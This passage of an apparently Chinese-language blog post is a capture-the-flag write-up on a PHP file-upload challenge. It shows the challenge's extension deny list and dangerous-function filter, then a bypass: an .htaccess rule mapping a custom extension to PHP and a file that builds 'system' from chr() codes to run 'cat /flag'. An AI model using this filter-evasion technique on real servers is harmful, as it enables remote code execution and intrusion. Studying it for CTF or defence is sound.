class="variable">$s</span>)-<span class="number">1</span>;<span class="variable">$i</span>&gt;<span class="number">0</span>;<span class="variable">$i</span>--)&#123;</span><br><span class="line">                <span class="variable">$c</span>=substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> == strlen(<span class="variable">$s</span>)-<span class="number">1</span> <span class="keyword">and</span> <span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> substr(<span class="variable">$s</span>,<span class="number">0</span>,<span class="variable">$i</span>+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span>=<span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span>=trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span>=deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span>=strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span>=strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span>=str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span>=trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            </span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;</span>,file_get_contents(<span class="variable">$temp_file</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不能含有危险函数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span>=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$img_path</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请重新上传！&#x27;</span>;</span><br><span class="line">        mkdir(UPLOAD_PATH,<span class="number">775</span>,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>阅读代码后，知道对危险函数进行了过滤，这时候可以使用aiisc码拼接动态构造函数来绕过。</p>
+<p>上传.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br></pre></td></tr></table></figure>
+
+<p>上传mua.aaa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</span><br><span class="line">$a(&#x27;cat /flag&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025210307444.png" alt="image-20201025210307444"></p>
+<p>拿flag</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20201025210329259.png" alt="image-20201025210329259"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞" target="_blank" rel="external">http://example.com/2020/10/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">chickenmushroom</span><small class="ml-1x">Web</small></a></h3>
+        <div>平平无奇的小红帽。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/10/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/10/07/%E5%BC%80%E5%8F%91PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE-%E6%9F%A5%E8%AF%A2%E5%BD%95%E5%8F%96%E7%BB%93%E6%9E%9C%EF%BC%881%EF%BC%89/" title="开发PHP小项目-查询录取结果（1）：前端设计"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
